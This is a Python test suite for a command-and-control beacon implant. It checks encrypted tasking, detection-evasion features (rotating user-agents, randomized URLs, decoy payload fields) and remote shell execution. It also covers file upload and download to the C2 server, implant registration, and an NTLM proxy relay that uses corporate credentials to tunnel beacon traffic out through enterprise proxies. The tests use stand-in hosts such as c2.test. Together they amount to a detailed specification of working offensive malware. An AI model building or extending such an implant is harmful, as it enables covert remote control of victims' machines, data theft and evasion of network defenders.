#!/usr/bin/env python3
"""
Unit tests for the C2 beacon: encryption, evasion, command execution,
result reporting, and backoff logic.
"""

import base64
import json
import os
import shutil
import socket
import struct
import sys
import tempfile
import threading
import time
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch


def _make_config(**overrides):
    cfg = {
        "c2": {
            "beacon_interval_seconds": 10,
            "jitter_percent": 20,
            "encryption_key": "",
            "proxy": {"mode": "none"},
            "https": {
                "enabled": True,
                "callback_url": "https://c2.test/api/v1/beacon",
                "verify_ssl": False,
            },
            "dns": {
                "enabled": True,
                "domain": "c2.test",
                "resolver": "8.8.8.8",
            },
        }
    }
    cfg["c2"].update(overrides)
    return cfg


class TestEncryption(unittest.TestCase):
    def test_encrypt_decrypt_roundtrip(self):
        from software.c2.beacon import Beacon
        config = _make_config()
        b = Beacon(config)

        data = {"cmd": "shell", "args": "whoami", "id": "task-1"}
        encrypted = b._encrypt(data)
        decrypted = b._decrypt(encrypted)

        self.assertEqual(decrypted, data)

    def test_explicit_key_used(self):
        from software.c2.beacon import Beacon

        key = os.urandom(32)
        key_b64 = base64.b64encode(key).decode()
        config = _make_config(encryption_key=key_b64)
        b = Beacon(config)

        self.assertEqual(b._key, key)

    def test_derived_key_deterministic(self):
        from software.c2.beacon import Beacon

        b1 = Beacon(_make_config())
        b2 = Beacon(_make_config())

        self.assertEqual(b1._key, b2._key)

    def test_different_urls_different_keys(self):
        from software.c2.beacon import Beacon

        c1 = _make_config()
        c2 = _make_config()
        c2["c2"]["https"]["callback_url"] = "https://other.test/beacon"

        b1 = Beacon(c1)
        b2 = Beacon(c2)

        self.assertNotEqual(b1._key, b2._key)

    def test_nonce_uniqueness(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())
        data = {"test": True}

        ct1 = b._encrypt(data)
        ct2 = b._encrypt(data)

        self.assertNotEqual(ct1, ct2)


class TestEvasion(unittest.TestCase):
    def test_evasive_url_randomized(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        urls = {b._evasive_url("beacon") for _ in range(20)}
        self.assertGreater(len(urls), 5)

    def test_evasive_url_contains_endpoint(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())
        url = b._evasive_url("register")
        self.assertIn("register", url)

    def test_evasive_headers_have_required_fields(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())
        headers = b._evasive_headers()

        self.assertIn("User-Agent", headers)
        self.assertIn("Accept", headers)
        self.assertIn("Content-Type", headers)
        self.assertNotEqual(headers["User-Agent"], "CiscoIPPhone/1.0")

    def test_user_agent_rotates(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        uas = {b._evasive_headers()["User-Agent"] for _ in range(50)}
        self.assertGreater(len(uas), 3)

    def test_wrap_payload_has_decoys(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        wrapped = b._wrap_payload({"test": "data"})
        self.assertGreater(len(wrapped), 3)

    def test_wrap_unwrap_roundtrip(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        original = {"cmd": "shell", "args": "id"}
        wrapped = b._wrap_payload(original)
        unwrapped = b._unwrap_response(wrapped)

        self.assertEqual(unwrapped, original)

    def test_payload_field_name_varies(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        from software.c2.beacon import _PAYLOAD_FIELDS
        data = {"test": True}

        fields_used = set()
        for _ in range(50):
            wrapped = b._wrap_payload(data)
            for k in wrapped:
                if k in _PAYLOAD_FIELDS:
                    fields_used.add(k)
        self.assertGreater(len(fields_used), 3)


class TestShellExecution(unittest.TestCase):
    def test_shell_captures_stdout(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        if os.name == "nt":
            output = b._exec_shell("echo hello_world")
        else:
            output = b._exec_shell("echo hello_world")
        self.assertIn("hello_world", output)

    def test_shell_captures_stderr(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        if os.name == "nt":
            output = b._exec_shell("echo error_msg 1>&2")
        else:
            output = b._exec_shell("echo error_msg >&2")
        self.assertIn("error_msg", output)

    def test_shell_timeout(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        if os.name == "nt":
            output = b._exec_shell("ping -n 10 127.0.0.1", timeout=1)
        else:
            output = b._exec_shell("sleep 10", timeout=1)
        self.assertIn("timeout", output.lower())

    def test_shell_nonzero_exit(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        if os.name == "nt":
            output = b._exec_shell("cmd /c exit 42")
        else:
            output = b._exec_shell("exit 42")
        self.assertIn("exit", output.lower())

    def test_output_truncated(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        if os.name == "nt":
            cmd = 'python -c "print(\'A\' * 100000)"'
        else:
            cmd = "python3 -c \"print('A' * 100000)\""
        output = b._exec_shell(cmd)
        self.assertLessEqual(len(output), 65536)


class TestFileOps(unittest.TestCase):
    def test_ls(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "file1.txt").write_text("hello")
            (Path(tmpdir) / "file2.txt").write_text("world")

            output = b._exec_ls(tmpdir)
            self.assertIn("file1.txt", output)
            self.assertIn("file2.txt", output)

    def test_ls_nonexistent(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())
        output = b._exec_ls("/nonexistent/path/xyz")
        self.assertIn("No such file", output)

    def test_cat(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        with tempfile.TemporaryDirectory() as tmpdir:
            target = Path(tmpdir) / "test.txt"
            target.write_text("test content 12345")
            output = b._exec_cat(str(target))
            self.assertIn("test content 12345", output)

    def test_pwd_and_cd(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        original = os.getcwd()
        tmpdir = tempfile.mkdtemp()
        try:
            pwd = b._exec_pwd()
            self.assertEqual(pwd, original)

            result = b._exec_cd(tmpdir)
            self.assertEqual(os.path.realpath(os.getcwd()), os.path.realpath(result))
        finally:
            os.chdir(original)
            shutil.rmtree(tmpdir, ignore_errors=True)

    def test_mkdir_and_rm(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        with tempfile.TemporaryDirectory() as tmpdir:
            target = os.path.join(tmpdir, "sub", "dir")
            output = b._exec_mkdir(target)
            self.assertIn("Created", output)
            self.assertTrue(Path(target).is_dir())

            output = b._exec_rm(target)
            self.assertIn("Removed", output)
            self.assertFalse(Path(target).exists())

    def test_write_and_cat(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        with tempfile.TemporaryDirectory() as tmpdir:
            target = os.path.join(tmpdir, "test.txt")
            b._exec_write(target, "written content")
            output = b._exec_cat(target)
            self.assertEqual(output, "written content")

    def test_cp(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        with tempfile.TemporaryDirectory() as tmpdir:
            src = Path(tmpdir) / "src.txt"
            dst = Path(tmpdir) / "dst.txt"
            src.write_text("copy me")

            output = b._exec_cp(str(src), str(dst))
            self.assertIn("Copied", output)
            self.assertEqual(dst.read_text(), "copy me")

    def test_mv(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        with tempfile.TemporaryDirectory() as tmpdir:
            src = Path(tmpdir) / "src.txt"
            dst = Path(tmpdir) / "dst.txt"
            src.write_text("move me")

            output = b._exec_mv(str(src), str(dst))
            self.assertIn("Moved", output)
            self.assertFalse(src.exists())
            self.assertEqual(dst.read_text(), "move me")

    def test_download(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        with tempfile.TemporaryDirectory() as tmpdir:
            target = Path(tmpdir) / "test.bin"
            target.write_bytes(b"\x00\x01\x02\x03")
            result = b._exec_download(str(target))
            self.assertEqual(result["size"], 4)
            self.assertEqual(
                base64.b64decode(result["data"]),
                b"\x00\x01\x02\x03",
            )

    def test_upload(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        with tempfile.TemporaryDirectory() as tmpdir:
            target = os.path.join(tmpdir, "uploaded.bin")
            data = base64.b64encode(b"uploaded content").decode()

            output = b._exec_upload(target, data)
            self.assertIn("Uploaded", output)
            self.assertEqual(Path(target).read_bytes(), b"uploaded content")


class TestTaskDispatcher(unittest.TestCase):
    def test_sleep_updates_interval(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())
        b.https_enabled = False

        b._process_tasking({"cmd": "sleep", "args": "60 30"})
        self.assertEqual(b.interval, 60)
        self.assertAlmostEqual(b.jitter, 0.3, places=2)

    def test_kill_stops_beacon(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())
        b._running = True
        b.https_enabled = False

        b._process_tasking({"cmd": "kill"})
        self.assertFalse(b._running)

    def test_shell_executes_command(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())
        b.https_enabled = False

        if os.name == "nt":
            b._process_tasking({"cmd": "shell", "args": "echo dispatcher_test"})
        else:
            b._process_tasking({"cmd": "shell", "args": "echo dispatcher_test"})

    @patch("software.c2.beacon.Beacon._https_post")
    def test_result_sent_back(self, mock_post):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())
        b._agent_id = "test-agent"

        b._process_tasking({
            "id": "task-42",
            "cmd": "pwd",
        })

        mock_post.assert_called()
        call_args = mock_post.call_args
        self.assertEqual(call_args[0][0], "result")
        result_data = call_args[0][1]
        self.assertEqual(result_data["task_id"], "task-42")
        self.assertEqual(result_data["status"], "ok")

    def test_unknown_command_returns_error(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())
        b.https_enabled = False

        b._process_tasking({"cmd": "nonexistent_cmd"})


class TestBackoff(unittest.TestCase):
    @patch("time.sleep")
    def test_backoff_increases_with_failures(self, mock_sleep):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        b._consecutive_failures = 1
        b._backoff_sleep()
        delay_1 = mock_sleep.call_args[0][0]

        mock_sleep.reset_mock()

        b._consecutive_failures = 5
        b._backoff_sleep()
        delay_5 = mock_sleep.call_args[0][0]

        self.assertGreater(delay_5, delay_1)

    @patch("time.sleep")
    def test_backoff_capped_at_300s(self, mock_sleep):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        b._consecutive_failures = 100
        b._backoff_sleep()
        delay = mock_sleep.call_args[0][0]

        self.assertLessEqual(delay, 360)  # 300 + 20% jitter max


class TestRegistration(unittest.TestCase):
    @patch("software.c2.beacon.Beacon._https_post")
    def test_successful_registration(self, mock_post):
        from software.c2.beacon import Beacon

        mock_post.return_value = {"success": True, "agent_id": "raccoon-7"}
        b = Beacon(_make_config())

        result = b._register_https()
        self.assertTrue(result)
        self.assertEqual(b._agent_id, "raccoon-7")
        self.assertTrue(b._registered)

    @patch("software.c2.beacon.Beacon._https_post")
    def test_failed_registration(self, mock_post):
        from software.c2.beacon import Beacon

        mock_post.return_value = None
        b = Beacon(_make_config())

        result = b._register_https()
        self.assertFalse(result)
        self.assertFalse(b._registered)


class TestImplantId(unittest.TestCase):
    def test_id_is_deterministic(self):
        from software.c2.beacon import Beacon
        b1 = Beacon(_make_config())
        b2 = Beacon(_make_config())
        self.assertEqual(b1._implant_id, b2._implant_id)

    def test_id_is_16_hex_chars(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())
        self.assertEqual(len(b._implant_id), 16)
        int(b._implant_id, 16)


# ── NTLM proxy relay ──


class _FakeNtlmProxy:
    """Minimal upstream proxy that demands NTLM for CONNECT, then echoes bytes.

    Records the Type 1 and Type 3 messages it receives so tests can inspect the
    credentials the relay actually put on the wire.
    """

    def __init__(self, require_auth=True, close_after_407=False):
        self.require_auth = require_auth
        self.close_after_407 = close_after_407
        self.challenge = b"\x01\x02\x03\x04\x05\x06\x07\x08"
        self.type1 = None
        self.type3 = None
        self.connections = 0
        self._sock = None
        self._port = 0
        self._running = False

    @property
    def port(self):
        return self._port

    def start(self):
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind(("127.0.0.1", 0))
        self._port = self._sock.getsockname()[1]
        self._sock.listen(10)
        self._running = True
        threading.Thread(target=self._accept, daemon=True).start()
        return self._port

    def stop(self):
        self._running = False
        if self._sock:
            self._sock.close()
            self._sock = None

    def _accept(self):
        while self._running:
            try:
                conn, _ = self._sock.accept()
            except OSError:
                break
            self.connections += 1
            threading.Thread(target=self._handle, args=(conn,), daemon=True).start()

    def _make_type2(self):
        target_info = b"\x02\x00\x08\x00T\x00E\x00S\x00T\x00\x00\x00\x00\x00"
        msg = bytearray(56)
        msg[0:8] = b"NTLMSSP\x00"
        struct.pack_into("<I", msg, 8, 2)
        struct.pack_into("<HHI", msg, 12, 0, 0, 56)
        struct.pack_into("<I", msg, 20, 0x00088205)
        msg[24:32] = self.challenge
        struct.pack_into("<HHI", msg, 40, len(target_info), len(target_info), 56)
        return bytes(msg) + target_info

    def _handle(self, conn):
        try:
            conn.settimeout(10)
            while True:
                request_line = _read_line(conn)
                if not request_line:
                    return
                headers = {}
                while True:
                    line = _read_line(conn)
                    if not line:
                        break
                    name, _, value = line.partition(":")
                    headers[name.strip().lower()] = value.strip()

                if not self.require_auth:
                    conn.sendall(b"HTTP/1.1 200 Connection Established\r\n\r\n")
                    self._echo(conn)
                    return

                auth = headers.get("proxy-authorization", "")
                if not auth:
                    extra = "Connection: close\r\n" if self.close_after_407 else ""
                    conn.sendall(
                        f"HTTP/1.1 407 Proxy Authentication Required\r\n"
                        f"Proxy-Authenticate: NTLM\r\nContent-Length: 0\r\n"
                        f"{extra}\r\n".encode())
                    if self.close_after_407:
                        return
                    continue

                token = base64.b64decode(auth.split(" ", 1)[1])
                msg_type = struct.unpack_from("<I", token, 8)[0]

                if msg_type == 1:
                    self.type1 = token
                    challenge_b64 = base64.b64encode(self._make_type2()).decode()
                    conn.sendall(
                        f"HTTP/1.1 407 Proxy Authentication Required\r\n"
                        f"Proxy-Authenticate: NTLM {challenge_b64}\r\n"
                        f"Content-Length: 0\r\n\r\n".encode())
                    continue

                if msg_type == 3:
                    self.type3 = token
                    conn.sendall(b"HTTP/1.1 200 Connection Established\r\n\r\n")
                    self._echo(conn)
                    return

                conn.sendall(b"HTTP/1.1 400 Bad Request\r\n\r\n")
                return
        except Exception:
            pass
        finally:
            try:
                conn.close()
            except Exception:
                pass

    @staticmethod
    def _echo(conn):
        try:
            while True:
                data = conn.recv(4096)
                if not data:
                    break
                conn.sendall(data)
        except Exception:
            pass


def _read_line(sock):
    """Read one CRLF-terminated line, returning '' on blank line or EOF."""
    buf = []
    while True:
        b = sock.recv(1)
        if not b:
            return "".join(buf)
        if b == b"\n":
            break
        if b != b"\r":
            buf.append(b.decode("latin-1"))
    return "".join(buf)


def _parse_type3(msg):
    """Unpack a Type 3 message into its fields for assertions."""
    def field(offset):
        length, _, off = struct.unpack_from("<HHI", msg, offset)
        return msg[off:off + length]

    return {
        "signature": msg[0:8],
        "type": struct.unpack_from("<I", msg, 8)[0],
        "flags": struct.unpack_from("<I", msg, 60)[0],
        "lm": field(12),
        "nt": field(20),
        "domain": field(28).decode("utf-16-le"),
        "user": field(36).decode("utf-16-le"),
        "workstation": field(44).decode("utf-16-le"),
        "session_key": field(52),
    }


class TestNtlmPrimitives(unittest.TestCase):
    """MD4 and NTLMv2 key derivation against published reference vectors."""

    def test_md4_rfc1320_vectors(self):
        from software.c2.beacon import _NtlmProxyRelay

        vectors = {
            b"": "31d6cfe0d16ae931b73c59d7e0c089c0",
            b"a": "bde52cb31de33e46245e05fbdbd6fb24",
            b"abc": "a448017aaf21d8525fc10ae87aa6729d",
            b"message digest": "d9130a8164549fe818874806e1c7014b",
            b"abcdefghijklmnopqrstuvwxyz": "d79e1c308aa5bbcdeea8ed63df412da9",
            b"1234567890" * 8: "e33b4ddc9c38f2199c3e7b164fcc0536",
        }
        for data, expected in vectors.items():
            self.assertEqual(_NtlmProxyRelay._md4(data).hex(), expected,
                             f"MD4 mismatch for {data!r}")

    def test_ntowfv1_ms_nlmp_vector(self):
        """MS-NLMP 4.2.4.1.1: NTOWFv1 of password 'Password'."""
        from software.c2.beacon import _NtlmProxyRelay

        nt_hash = _NtlmProxyRelay._md4("Password".encode("utf-16-le"))
        self.assertEqual(nt_hash.hex(), "a4f49c406510bdcab6824ee7c30fd852")

    def test_ntowfv2_ms_nlmp_vector(self):
        """MS-NLMP 4.2.4.1.1: NTOWFv2 for User/Domain/Password."""
        from software.c2.beacon import _NtlmProxyRelay

        nt_hash = _NtlmProxyRelay._md4("Password".encode("utf-16-le"))
        identity = ("USER" + "Domain").encode("utf-16-le")
        self.assertEqual(_NtlmProxyRelay._hmac_md5(nt_hash, identity).hex(),
                         "0c868a403bfd7a93a3001ef22ef02e3f")


class TestNtlmIdentity(unittest.TestCase):
    def test_backslash_form(self):
        from software.c2.beacon import _NtlmProxyRelay
        self.assertEqual(_NtlmProxyRelay._split_identity("CORP\\alice", ""),
                         ("alice", "CORP"))

    def test_forward_slash_form(self):
        from software.c2.beacon import _NtlmProxyRelay
        self.assertEqual(_NtlmProxyRelay._split_identity("CORP/alice", ""),
                         ("alice", "CORP"))

    def test_upn_form(self):
        from software.c2.beacon import _NtlmProxyRelay
        self.assertEqual(_NtlmProxyRelay._split_identity("alice@corp.local", ""),
                         ("alice", "corp.local"))

    def test_explicit_domain_wins(self):
        from software.c2.beacon import _NtlmProxyRelay
        self.assertEqual(_NtlmProxyRelay._split_identity("CORP\\alice", "OTHER"),
                         ("CORP\\alice", "OTHER"))

    def test_bare_username(self):
        from software.c2.beacon import _NtlmProxyRelay
        self.assertEqual(_NtlmProxyRelay._split_identity("alice", ""),
                         ("alice", ""))

    def test_workstation_defaults_to_hostname(self):
        from software.c2.beacon import _NtlmProxyRelay
        relay = _NtlmProxyRelay("proxy.corp", 8080, "alice", "pw")
        self.assertTrue(relay._workstation)
        self.assertNotEqual(relay._workstation, "WORK")

    def test_identity_property(self):
        from software.c2.beacon import _NtlmProxyRelay
        relay = _NtlmProxyRelay("proxy.corp", 8080, "CORP\\alice", "pw")
        self.assertEqual(relay.identity, "CORP\\alice")
        self.assertEqual(_NtlmProxyRelay("p", 1, "bob", "pw").identity, "bob")


class TestNtlmMessages(unittest.TestCase):
    def _relay(self, user="CORP\\alice", password="Passw0rd!", **kw):
        from software.c2.beacon import _NtlmProxyRelay
        return _NtlmProxyRelay("proxy.corp", 8080, user, password, **kw)

    def test_type1_structure(self):
        msg = self._relay()._make_type1()
        self.assertEqual(len(msg), 32)
        self.assertEqual(msg[0:8], b"NTLMSSP\x00")
        self.assertEqual(struct.unpack_from("<I", msg, 8)[0], 1)
        flags = struct.unpack_from("<I", msg, 12)[0]
        self.assertTrue(flags & 0x00000001, "NEGOTIATE_UNICODE must be set")
        self.assertTrue(flags & 0x00000200, "NEGOTIATE_NTLM must be set")
        self.assertTrue(flags & 0x00080000, "EXTENDED_SESSIONSECURITY must be set")

    def test_type3_carries_domain_user_workstation(self):
        relay = self._relay(workstation="LAPTOP7")
        fake = _FakeNtlmProxy()
        parsed = _parse_type3(relay._make_type3(fake._make_type2()))

        self.assertEqual(parsed["signature"], b"NTLMSSP\x00")
        self.assertEqual(parsed["type"], 3)
        self.assertEqual(parsed["domain"], "CORP")
        self.assertEqual(parsed["user"], "alice")
        self.assertEqual(parsed["workstation"], "LAPTOP7")

    def test_type3_session_key_empty_without_key_exch(self):
        """A populated session key without NEGOTIATE_KEY_EXCH gets us rejected."""
        relay = self._relay()
        msg = relay._make_type3(_FakeNtlmProxy()._make_type2())
        parsed = _parse_type3(msg)

        self.assertEqual(parsed["session_key"], b"")
        self.assertFalse(parsed["flags"] & 0x40000000,
                         "NEGOTIATE_KEY_EXCH must not be set")

    def test_type3_lm_response_empty(self):
        parsed = _parse_type3(self._relay()._make_type3(
            _FakeNtlmProxy()._make_type2()))
        self.assertEqual(parsed["lm"], b"")

    def test_type3_nt_response_is_ntlmv2_blob(self):
        relay = self._relay()
        fake = _FakeNtlmProxy()
        parsed = _parse_type3(relay._make_type3(fake._make_type2()))

        nt = parsed["nt"]
        # 16-byte NTProofStr + blob(28 bytes fixed + target info + 4 byte trailer)
        self.assertGreater(len(nt), 16 + 28)
        blob = nt[16:]
        self.assertEqual(blob[0:4], b"\x01\x01\x00\x00", "blob version header")
        self.assertIn(b"T\x00E\x00S\x00T\x00", blob, "target info echoed back")

    def test_type3_nt_proof_verifies(self):
        """Recompute the NTProofStr the way a server would and compare."""
        from software.c2.beacon import _NtlmProxyRelay

        relay = self._relay(user="CORP\\alice", password="Passw0rd!")
        fake = _FakeNtlmProxy()
        parsed = _parse_type3(relay._make_type3(fake._make_type2()))

        nt_proof, blob = parsed["nt"][:16], parsed["nt"][16:]
        nt_hash = _NtlmProxyRelay._md4("Passw0rd!".encode("utf-16-le"))
        ntv2 = _NtlmProxyRelay._hmac_md5(
            nt_hash, ("ALICE" + "CORP").encode("utf-16-le"))
        expected = _NtlmProxyRelay._hmac_md5(ntv2, fake.challenge + blob)

        self.assertEqual(nt_proof, expected)

    def test_type3_offsets_are_within_message(self):
        msg = self._relay()._make_type3(_FakeNtlmProxy()._make_type2())
        for offset in (12, 20, 28, 36, 44, 52):
            length, _, off = struct.unpack_from("<HHI", msg, offset)
            self.assertLessEqual(off + length, len(msg),
                                 f"field at header offset {offset} runs past end")

    def test_type3_rejects_malformed_challenge(self):
        relay = self._relay()
        with self.assertRaises(ValueError):
            relay._make_type3(b"garbage")
        with self.assertRaises(ValueError):
            relay._make_type3(b"NOTNTLM\x00" + b"\x00" * 40)


class TestNtlmRelayTunnel(unittest.TestCase):
    """End-to-end: local CONNECT client -> relay -> fake NTLM proxy -> echo."""

    def setUp(self):
        self.proxy = None
        self.relay = None

    def tearDown(self):
        if self.relay:
            self.relay.stop()
        if self.proxy:
            self.proxy.stop()

    def _setup(self, **proxy_kw):
        from software.c2.beacon import _NtlmProxyRelay

        self.proxy = _FakeNtlmProxy(**proxy_kw)
        self.proxy.start()
        self.relay = _NtlmProxyRelay(
            "127.0.0.1", self.proxy.port, "CORP\\alice", "Passw0rd!",
            workstation="LAPTOP7")
        self.relay.start()
        return self.relay

    def _connect(self, target="example.com:443"):
        sock = socket.create_connection(("127.0.0.1", self.relay.port), timeout=10)
        sock.settimeout(10)
        sock.sendall(
            f"CONNECT {target} HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())
        status = _read_line(sock)
        while _read_line(sock):
            pass
        return sock, status

    def test_tunnel_established_after_ntlm_handshake(self):
        self._setup()
        sock, status = self._connect()
        self.addCleanup(sock.close)

        self.assertIn("200", status)
        sock.sendall(b"beacon-payload")
        self.assertEqual(sock.recv(64), b"beacon-payload")

    def test_relay_sent_correct_credentials(self):
        self._setup()
        sock, _ = self._connect()
        self.addCleanup(sock.close)
        sock.sendall(b"x")
        sock.recv(16)

        self.assertIsNotNone(self.proxy.type1, "Type 1 never arrived")
        self.assertIsNotNone(self.proxy.type3, "Type 3 never arrived")
        parsed = _parse_type3(self.proxy.type3)
        self.assertEqual(parsed["domain"], "CORP")
        self.assertEqual(parsed["user"], "alice")
        self.assertEqual(parsed["workstation"], "LAPTOP7")

    def test_handshake_uses_single_connection(self):
        """Type 1 and Type 3 must share one TCP connection or NTLM fails."""
        self._setup()
        sock, status = self._connect()
        self.addCleanup(sock.close)

        self.assertIn("200", status)
        self.assertEqual(self.proxy.connections, 1)

    def test_reconnects_when_proxy_closes_after_407(self):
        self._setup(close_after_407=True)
        sock, status = self._connect()
        self.addCleanup(sock.close)

        self.assertIn("200", status)
        self.assertEqual(self.proxy.connections, 2,
                         "relay should have opened a fresh connection")
        sock.sendall(b"ping")
        self.assertEqual(sock.recv(16), b"ping")

    def test_passthrough_when_proxy_needs_no_auth(self):
        self._setup(require_auth=False)
        sock, status = self._connect()
        self.addCleanup(sock.close)

        self.assertIn("200", status)
        self.assertIsNone(self.proxy.type3, "no NTLM handshake should happen")
        sock.sendall(b"direct")
        self.assertEqual(sock.recv(16), b"direct")

    def test_large_transfer_not_truncated(self):
        """Guards the _bridge() fix: both directions must be joined.

        The client half-closes after sending, exactly like an HTTP client that
        has finished its request. If _bridge() only joins the client->upstream
        thread, the caller's finally-block closes both sockets and the response
        gets truncated.
        """
        self._setup()
        sock, _ = self._connect()
        self.addCleanup(sock.close)

        payload = os.urandom(256 * 1024)
        sock.sendall(payload)
        sock.shutdown(socket.SHUT_WR)

        received = b""
        while True:
            chunk = sock.recv(65536)
            if not chunk:
                break
            received += chunk
        self.assertEqual(len(received), len(payload),
                         "response truncated — bridge closed too early")
        self.assertEqual(received, payload)

    def test_non_connect_request_rejected(self):
        self._setup()
        sock = socket.create_connection(("127.0.0.1", self.relay.port), timeout=10)
        self.addCleanup(sock.close)
        sock.settimeout(10)
        sock.sendall(b"GET /  HTTP/1.1\r\nHost: x\r\n\r\n")

        self.assertIn("405", _read_line(sock))

    def test_stop_closes_listener(self):
        relay = self._setup()
        port = relay.port
        relay.stop()
        self.relay = None

        with self.assertRaises((ConnectionRefusedError, OSError)):
            socket.create_connection(("127.0.0.1", port), timeout=2).close()


class TestBeaconNtlmWiring(unittest.TestCase):
    def _ntlm_config(self, **ntlm):
        cfg = {"mode": "auto", "url": "", "ntlm": {
            "enabled": True, "host": "proxy.corp.local", "port": 8080,
            "username": "CORP\\alice", "password": "Passw0rd!",
        }}
        cfg["ntlm"].update(ntlm)
        return _make_config(proxy=cfg)

    def test_relay_becomes_session_proxy(self):
        from software.c2.beacon import Beacon

        b = Beacon(self._ntlm_config())
        b._init_proxy()
        self.addCleanup(b.stop)

        self.assertIsNotNone(b._ntlm_relay)
        self.assertEqual(b._proxy_session.proxies["https"], b._ntlm_relay.url)
        self.assertEqual(b._proxy_session.proxies["http"], b._ntlm_relay.url)

    def test_disabled_ntlm_is_ignored(self):
        from software.c2.beacon import Beacon

        b = Beacon(_make_config(proxy={"mode": "none", "ntlm": {"enabled": False}}))
        b._init_proxy()
        self.assertIsNone(b._ntlm_relay)

    def test_missing_credentials_skips_relay(self):
        from software.c2.beacon import Beacon

        b = Beacon(self._ntlm_config(username="", password=""))
        b._init_proxy()
        self.addCleanup(b.stop)
        self.assertIsNone(b._ntlm_relay)

    def test_no_upstream_and_no_discovery_skips_relay(self):
        from software.c2.beacon import Beacon

        b = Beacon(self._ntlm_config(host=""))
        with patch.object(b._proxy, "discover_all", return_value=[]):
            b._init_proxy()
        self.addCleanup(b.stop)
        self.assertIsNone(b._ntlm_relay)

    def test_upstream_discovered_when_host_omitted(self):
        from software.c2.beacon import Beacon

        b = Beacon(self._ntlm_config(host=""))
        discovered = [{"url": "http://autoproxy.corp:3128", "is_pac": False}]
        with patch.object(b._proxy, "discover_all", return_value=discovered):
            b._init_proxy()
        self.addCleanup(b.stop)

        self.assertIsNotNone(b._ntlm_relay)
        self.assertEqual(b._ntlm_relay.upstream_url, "http://autoproxy.corp:3128")

    def test_proxy_mode_none_skips_relay(self):
        from software.c2.beacon import Beacon

        cfg = self._ntlm_config()
        cfg["c2"]["proxy"]["mode"] = "none"
        b = Beacon(cfg)
        b._init_proxy()
        self.addCleanup(b.stop)
        self.assertIsNone(b._ntlm_relay)

    def test_proxyinfo_reports_relay(self):
        from software.c2.beacon import Beacon

        b = Beacon(self._ntlm_config())
        b._init_proxy()
        self.addCleanup(b.stop)

        out = b._exec_proxyinfo()
        self.assertIn("NTLM relay: active", out)
        self.assertIn("proxy.corp.local:8080", out)
        self.assertIn("CORP\\alice", out)

    def test_system_info_reports_upstream_not_localhost(self):
        from software.c2.beacon import Beacon

        b = Beacon(self._ntlm_config())
        b._init_proxy()
        self.addCleanup(b.stop)

        active = b._system_info()["proxy_active"]
        self.assertIn("proxy.corp.local:8080", active)
        self.assertNotIn("127.0.0.1", active)

    def test_stop_tears_down_relay(self):
        from software.c2.beacon import Beacon

        b = Beacon(self._ntlm_config())
        b._init_proxy()
        port = b._ntlm_relay.port
        b.stop()

        self.assertIsNone(b._ntlm_relay)
        with self.assertRaises((ConnectionRefusedError, OSError)):
            socket.create_connection(("127.0.0.1", port), timeout=2).close()


if __name__ == "__main__":
    unittest.main()
